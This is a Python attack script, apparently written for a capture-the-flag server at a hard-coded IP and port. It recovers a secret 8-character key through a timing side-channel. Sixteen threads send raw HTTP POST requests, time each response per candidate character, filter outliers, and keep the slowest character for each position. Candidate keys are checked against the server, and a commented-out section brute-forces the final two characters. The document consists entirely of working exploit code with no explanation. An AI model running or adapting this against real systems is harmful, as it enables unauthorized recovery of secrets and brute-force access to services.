#! /usr/bin/python3

#import urllib.request, sys, urllib.urlencode
import sys, time, threading
from httplib2 import Http
from random import shuffle
import socket, queue
import numpy

q = queue.Queue()
q2 = queue.Queue()

alphabet = ""
#alphabet = "abcdefghijklmnopqrstuvwxyz"
#alphabet += alphabet.upper()
#alphabet += "0123456789"
#alphabet += " "
#alphabet += "!\"#$%&'()*+´-./:;<=>?@[\]^_`{|}~"

for i in range(32, 127):
    alphabet += chr(i)

alphabet = list(alphabet)
N_THREADS = 16
key_len = 8

key_base = list("A"*key_len)
#key_base = list("25fe20AA")
pos = 0

timing = {}
threads = {}

input = sys.stdin.readline()[:-1]

url = "http://54.83.207.90:4242/?input=" + input
args = "/?input=" + input
ip = "54.83.207.90"
port = 4242

def test_key2():
    while True:
        key = q.get()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        data = "input=" + input + "&key=" + key + "&submit=Submit+Query"
        msg = "POST "+args+" HTTP/1.1\r\n" +\
              "Content-Length: " + str(len(data)) + "\r\n\r\n" +\
              data
        
        msg = msg.encode("ASCII")

        start = time.time()
        sent = s.send(msg)
        msg = s.recv(1500)
        msg += s.recv(1500)
        end = time.time()

        delta = end - start
        timing[key[pos]].append(delta)
        s.close()

        q.task_done()
        
def check_key_thread():
    while True:
        key = q2.get()
        #print(key)
        if check_key(key) == True:
            print("KEY FOUND!!!")
            print(key)
            sys.exit(0)
        q2.task_done()
    
def check_key(key):
    h = Http()
    #print("testing key:", key)
    data = "input=" + input + "&key=" + key + "&submit=Submit+Query"
    resp, content = h.request(url, "POST", data)
    c = content.decode("ASCII")
    if c[39:44] == "wrong":
        return False
    else:
        return True

for i in range(N_THREADS):
    t = threading.Thread(target=test_key2)
    t.daemon = True
    t.start()

for i in range(N_THREADS):
    t = threading.Thread(target=check_key_thread)
    t.daemon = True
    t.start()

while True:
    for n in range(0, key_len): #16
        pos = n
        
        #if n == 6:
        #    print("Bruteforcing last 2 chars")
        #    for i in alphabet:
        #        for j in alphabet:
        #            key = key_base
        #            key[6] = i
        #            key[7] = j
        #            key = ''.join(key)
        #            q2.put(key)
        #    q2.join()
        #    print("It didn't work")
        #    sys.exit(0)
        
        for i in alphabet:
            timing[i] = []
        
        rep = 16
        #if n > 4:
        #    rep = 128
        #if n < 4:
        #    rep = 16
        #else:
        #    rep = 16 + 16 * (n - 3)
        for i in range(0, rep): #10
            max_delta = 0
            char = ''
            shuffle(alphabet)
            for i in alphabet:
                key = key_base
                key[pos] = i
                key = ''.join(key)
                #print(key)
                q.put(key)
                
            q.join()
            time.sleep(0.1)

        std = 0
        for k in timing:
            std += numpy.std(timing[k])
        mean_std = std / len(timing)

        mean_timing = {}
        for k in timing:
            mean_timing[k] = []
            mean = numpy.mean(timing[k])
            
            for t in timing[k]:
                if abs(mean - t) < mean_std:
                    mean_timing[k].append(t)
            if len(mean_timing[k]) == 0:
                mean_timing[k] = 0
            else:
                mean_timing[k] = numpy.mean(mean_timing[k])

        max_t = 0
        max_k = ''
        for k in mean_timing:
            if mean_timing[k] > max_t:
                max_t = mean_timing[k]
                max_k = k

        k = max_k
        key_base[pos] = k
        print(''.join(key_base))
           
        if check_key(''.join(key_base)):
            print(''.join(key_base))
            sys.exit(0)
